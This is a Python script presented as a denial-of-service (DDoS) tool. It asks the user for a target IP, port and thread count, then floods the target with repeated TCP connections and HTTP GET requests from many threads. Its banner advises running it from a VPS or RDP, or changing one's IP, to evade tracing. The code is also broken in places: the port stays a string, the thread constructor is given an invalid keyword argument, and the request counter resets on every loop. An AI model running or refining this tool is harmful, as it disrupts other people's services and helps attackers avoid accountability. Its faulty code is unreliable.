#ta7ya l toilet
import socket
import threading
import time


print('''
 ____  ____   ___  ____                      _       _     _           
|  _ \|  _ \ / _ \/ ___|       ___  ___ _ __(_)_ __ | |_  | |__  _   _ 
| | | | | | | | | \___ \ _____/ __|/ __| '__| | '_ \| __| | '_ \| | | |
| |_| | |_| | |_| |___) |_____\__ \ (__| |  | | |_) | |_  | |_) | |_| |
|____/|____/ \___/|____/      |___/\___|_|  |_| .__/ \__| |_.__/ \__, |
                                              |_|                |___/ 
__     __      __  __ _  _   _  ___  _   ____   _____     __
\ \   / /     |  \/  | || | | |/ / || | |  _ \ / _ \ \   / /
 \ \ / / ____ | |\/| | || |_| ' /| || |_| |_) | | | \ \ / / 
  \ V / |____|| |  | |__   _| . \|__   _|  _ <| |_| |\ V /  
   \_/        |_|  |_|  |_| |_|\_\  |_| |_| \_\\___/  \_/                                                    
''')

time.sleep(1)

print('''
|-------------------------ATTENTION------------------------------|
|    1!= you'd better run this script on VPS or RDP              |
|    2!= if u dont have one of them u should change your IP-add  |
|----------------------------------------------------------------|
''')

time.sleep(2)

#============target info================#
zombie_IP = input("Enter your target's IP : ")
zombie_PORT = input("Enter the port : ")

print('''
#=======================================================#
#                                                       #
#  (number of requests < 500) = for low end computers   #
#  (500 > number of requests) = for high end computers  #
#                                                       #
#=======================================================#
''')
N_thread = input("choose the number of  requests : ")
print("LOADING ...")

time.sleep(2)

#============Attack func================#
def attack():
    #infinity stones
    while True:
        catapulta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        catapulta.connect((zombie_IP, zombie_PORT))
        catapulta.sendto(("GET /" + zombie_IP + " HTTP/1.1\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
        
        #===========info about the number of attacks=============#
        global request_num
        request_num = 0
        request_num += 1
        print(request_num)
        
        catapulta.close()
#============number of threads==========#
for i in range(int(N_thread)):
    N_0F_7 = threading.Thread(zombie_IP = attack)
    N_0F_7.start()
            
print("DONE")